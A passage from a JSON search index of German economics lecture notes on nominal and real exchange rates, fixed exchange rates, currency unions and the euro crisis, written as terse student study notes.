            "text": "Nominaler Wechselkurs  e : Verh\u00e4ltnis einer W\u00e4hrung (= M3 Menge) zur anderen  Ist volkswirtschaftlich unwichtig    Sinkt nominaler Kurs, wird die inl\u00e4ndische W\u00e4hrung  aufgewertet  Schlecht f\u00fcr Exporte", 
            "title": "Wechselkurse"
        }, 
        {
            "location": "/Vwl/9_Wechselkurse/#realer-wechselkurs", 
            "text": "Realer Wechselkurs:  r = \\frac{e \\cdot p*}{p}    p*  : Preis G\u00fcterkorb im Ausland in ausl\u00e4ndischer W\u00e4hrung   p : Preis G\u00fcterkorb im Inland in inl\u00e4ndischer W\u00e4hrung  Wechselkurs \u00e4ndert sich sofort mit der Geldmenge  Preise f\u00fcr den G\u00fcterkorb sind viel tr\u00e4ger  Mietpreise z.B. lassen sich erst nach 3 Monaten \u00e4ndern  im Durchschnitt 1-3 Jahre, bis Geldmengenerh\u00f6hung als Preiserh\u00f6hung komplett ankommt    Kurzfristig wird bei Erh\u00f6hung von  e  die W\u00e4hrung abgewertet, Gut f\u00fcr Exporte  Langfristig passt sich  p  aber an, realer Wechselkurs gleicht sich aus  Japan z.B. erh\u00f6hte die Geldmenge in den letzten Jahren, was langfristig nichts bringt", 
            "title": "Realer Wechselkurs"
        }, 
        {
            "location": "/Vwl/9_Wechselkurse/#fixe-wechselkurse", 
            "text": "z.B. Bretton-Woods nach 2. WK  Nachteil, dass das Land die Geldmenge an der Leitw\u00e4hrung anpassen muss  Wenn sich zwei L\u00e4ndern in unterschiedlichen Konjukturzyklen verhindern, funktioniert ein fixer Wechselkurs nicht (siehe D / GB)  Nach dem Bretton-Woods wurde EWS gegr\u00fcndet (ohne Schweiz), die W\u00e4hrungen wurden am D-Mark angeh\u00e4ngt  Inflationsraten gesunken in EWS-L\u00e4ndern   r  wurde wegen erh\u00f6hter Inflation als in Deutschland erh\u00f6ht, auch wenn der nominale Kurs konstant war (ab 1988) -  Zusammenbruch der Exportindustrie von Italien", 
            "title": "Fixe Wechselkurse"
        }, 
        {
            "location": "/Vwl/9_Wechselkurse/#wahrungsunionen", 
            "text": "Eine Zentralbank mit einer W\u00e4hrung f\u00fcr alle Nationen in der Union  Problem: Unterschiedliche Konjuktur  W\u00fcrde funktionieren, wenn flexible L\u00f6hne gelten w\u00fcrden und Arbeitskr\u00e4fte wandern w\u00fcrdern, die die Konjuktur ausgleichen w\u00fcrden  Funktioniert in Europa aber nicht durch kulturelle / sprachliche Unterschiede  In den USA geht das z.B.    EWU stellte zur Aufnahme Bedingungen an Geld- und Fiskalpolitik  Griechenland erf\u00fcllte Bedingungen nicht, kam aber trotzdem rein (\"Geburtsst\u00e4dte der Demokratie\")    Ziel der EU: Keine Kriege mehr von Europa ausgehend", 
            "title": "W\u00e4hrungsunionen"
        }, 
        {
            "location": "/Vwl/9_Wechselkurse/#eurokrise", 
            "text": "Nichts zu tun mit US Immobilienkrisen, nur fast gleichzeitig  2013: \u00dcberschuldung Griechenland erh\u00f6hte Sorge \u00fcber andere L\u00e4nder (Italien, Spanien, Portugal, etc.)  Vertrauen in R\u00fcckzahlungsf\u00e4higkeit der Staaten sinkt  Schuldzinsen waren vor 2000 in schw\u00e4cheren EU-Staaten viel h\u00f6her (weil h\u00f6heres Risiko) als z.B. in Deutschland  Mit Einf\u00fchrung des Euros wurden alle Schuldzinss\u00e4tze auf die Ebene Deutschlands gesenkt (durch Finanzm\u00e4rkte)  GIPS-Staaten nahmen so viel mehr Kredite auf und verschuldeten sich h\u00f6her, w\u00e4hrend Wirtschaftskraft sich nicht \u00e4nderte  NB: Deutschland hat Schuldgrenze von 60% des BIPs als erstes \u00fcberschritten, es gab keine Sanktionen daf\u00fcr  Verschuldung hat zum Zusammenbruch der Exportindustrie gef\u00fchrt   e  = 1  Wirtschaftsboom, Preisniveau steigt   r  wird kleiner, weil  p  schneller steigt als  p* , Wechselkurs wertet sich auf  Schw\u00e4cht Exportindustrie    L\u00f6sungsvorschl\u00e4ge, Eurozonen zu spalten in schwache und starke Euro-Zonen, aber das w\u00fcrde gegen die Friedenspolitische Idee der EU", 
            "title": "Eurokrise"
        }
    ]
}